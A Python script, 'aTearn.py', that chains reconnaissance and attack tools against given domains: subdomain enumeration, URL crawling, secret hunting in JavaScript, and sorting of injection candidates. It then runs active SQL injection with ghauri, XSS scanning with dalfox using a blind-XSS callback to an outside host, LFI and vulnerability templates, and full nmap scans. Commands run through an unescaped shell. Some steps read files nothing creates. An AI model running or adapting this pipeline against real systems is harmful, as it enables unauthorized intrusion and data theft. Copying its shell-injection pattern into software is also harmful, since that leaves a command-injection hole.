import argparse
import subprocess
import sys
import os

def run_command(command, output_file=None):
    """
    Run a shell command and print its output to stdout and optionally to a file.
    """
    try:
        print(f"Running: {command}")
        result = subprocess.run(command, shell=True, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # Print output to stdout
        if result.stdout:
            print(result.stdout)
        if result.stderr:
            print(result.stderr)

        # Optionally write to a file
        if output_file:
            with open(output_file, "a") as f:
                f.write(result.stdout + "\n")
                f.write(result.stderr + "\n")

        return result.stdout.strip()
    except Exception as e:
        print(f"Error while running command: {e}")
        return None

def main():
    parser = argparse.ArgumentParser(description="Automatic Time Earner - aTearn.py")
    parser.add_argument("-d", "--domain", type=str, help="Input domain or file with domains")
    parser.add_argument("-t", "--timeout", type=int, default=30, help="Timeout for operations (default: 30 seconds)")
    parser.add_argument("-o", "--output", type=str, default="aTearn_output", help="Output directory to save results")
    args = parser.parse_args()

    # Create output directory if it doesn't exist
    output_dir = os.path.abspath(args.output)
    os.makedirs(output_dir, exist_ok=True)

    # Check if input is from stdin
    if not sys.stdin.isatty():
        domains = sys.stdin.read().strip().split("\n")
        stdin_file = os.path.join(output_dir, "stdin_domains.txt")
        with open(stdin_file, "w") as f:
            f.write("\n".join(domains))
        args.domain = stdin_file

    if not args.domain:
        print("Error: You must provide a domain or domain list file!")
        sys.exit(1)

    # Workflow commands
    commands = [
        f"subfinder -dL {args.domain} -all -recursive -timeout {args.timeout} -t 200 -nW -exclude-sources digitorus > {os.path.join(output_dir, 'Subs.txt')}",
        f"assetfinder {args.domain} >> {os.path.join(output_dir, 'Subs.txt')}",
        f"cat {os.path.join(output_dir, 'Subs.txt')} | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > {os.path.join(output_dir, 'subdomains_alive.txt')}",
        f"cat {os.path.join(output_dir, 'subdomains_alive.txt')} | gau | katana -u - -d 6 -f qurl -jc -xhr -kf -fx -fs dn -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg | sort -u > {os.path.join(output_dir, 'allurls.txt')}",
        f"katana -u {os.path.join(output_dir, 'subdomains_alive.txt')} -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o {os.path.join(output_dir, 'allurls_katana.txt')}",
        f"subzy run --targets {os.path.join(output_dir, 'subdomains_alive.txt')} --concurrency 100 --hide_fails --verify_ssl",
        f"cat {os.path.join(output_dir, 'subdomains_alive.txt')} | gau | grep '.js' | httpx-toolkit -content-type | grep 'application/javascript' | awk '{{print $1}}' | nuclei -t /nuclei-templates/http/exposures/ -silent > {os.path.join(output_dir, 'secrets.txt')}",
        f"paramspider -l {os.path.join(output_dir, 'subdomains_alive.txt')} --stream | grep -Ev 'woff|css|js|png|svg|php|jpg' > {os.path.join(output_dir, 'params.txt')}",
        f"cat {os.path.join(output_dir, 'allurls.txt')} | gf sqli | anew | uro | uniq > {os.path.join(output_dir, 'sqli.txt')} ; cat {os.path.join(output_dir, 'sqli.txt')} | wc -l",
        f"cat {os.path.join(output_dir, 'allurls.txt')} | gf xss | anew | uro | uniq > {os.path.join(output_dir, 'xss.txt')} ; cat {os.path.join(output_dir, 'xss.txt')} | wc -l",
        f"cat {os.path.join(output_dir, 'allurls.txt')} | gf ssrf | anew | uro | uniq > {os.path.join(output_dir, 'ssrf.txt')} ; cat {os.path.join(output_dir, 'ssrf.txt')} | wc -l",
        f"cat {os.path.join(output_dir, 'allurls.txt')} | gf ssti | anew | uro | uniq > {os.path.join(output_dir, 'ssti.txt')} ; cat {os.path.join(output_dir, 'ssti.txt')} | wc -l",
        f"cat {os.path.join(output_dir, 'allurls.txt')} | gf lfi | anew | uro | uniq > {os.path.join(output_dir, 'lfi.txt')} ; cat {os.path.join(output_dir, 'lfi.txt')} | wc -l",
        f"cat -A {os.path.join(output_dir, '*')} | gf xss | tee {os.path.join(output_dir, 'xss_dalfox.txt')} ; cat {os.path.join(output_dir, 'xss_dalfox.txt')} | dalfox pipe -b https://xss.report/c/binbash",
        f"ghauri -m {os.path.join(output_dir, 'effective-urls.txt')} --batch --random-agent --level 1 | tee {os.path.join(output_dir, 'sqlmap.txt')}",
        f"corscanner -i {os.path.join(output_dir, 'subdomains_alive.txt')} -v -t 100",
        f"nuclei -l {os.path.join(output_dir, 'parameter.txt')} -t /nuclei-templates/http/vulnerabilities/generic/generic-linux-lfi.yaml -c 30",
        f"nmap -sS -p- -iL {os.path.join(output_dir, 'subdomains_alive.txt')} -oN {os.path.join(output_dir, 'PortScan_nmap.txt')}",
        f"nmap -Pn -sS -A -sV -sC -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -iL {os.path.join(output_dir, 'subdomains_alive.txt')} -oN {os.path.join(output_dir, 'portscan2.txt')}",
        f"nmap -Pn -A -sV -sC -iL {os.path.join(output_dir, 'subdomains_alive.txt')} -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -oN {os.path.join(output_dir, 'Scriptscan-result.txt')} --script=vuln",
        f"nmap -sT -p- -iL {os.path.join(output_dir, 'subdomains_alive.txt')} --script=banner -oN {os.path.join(output_dir, 'bannerScan_nmap.txt')}",
    ]

    # Run commands
    for command in commands:
        run_command(command, os.path.join(output_dir, "execution_log.txt"))

if __name__ == "__main__":
    main()
